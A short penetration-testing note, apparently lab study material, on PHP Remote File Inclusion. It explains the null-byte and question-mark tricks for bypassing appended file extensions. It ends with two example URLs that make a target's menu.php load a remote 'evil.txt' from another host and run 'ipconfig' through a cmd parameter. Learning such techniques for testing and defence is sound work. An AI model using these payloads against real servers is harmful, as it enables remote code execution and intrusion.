### RFI 

RFI by default (PHP) load and execute a file.

*Older versions of PHP have a vulnerability in which a null byte (%00) will
terminate any string. This trick can be used to bypass file extensions added
server-side and is useful for file inclusions because it prevents the file extension
from being considered as part of the string. In other words, if an application
reads in a parameter and appends “.php” to it, a null byte passed in the parameter
effectively ends the string without the “.php” extension. 
This gives an attacker more flexibility in what files can be loaded with the file inclusion vulnerability.

*Another trick for RFI payloads is to end them with a question mark (?) to mark
anything added to the URL server-side as part of the query string.*

### RFI Payload

```http
http://10.11.0.22/menu.php?file=http://10.11.0.4/evil.txt
```

### RFI Exploit

```http
http://10.11.0.22/menu.php?file=http://10.11.0.4/evil.txt&cmd=ipconfig
```
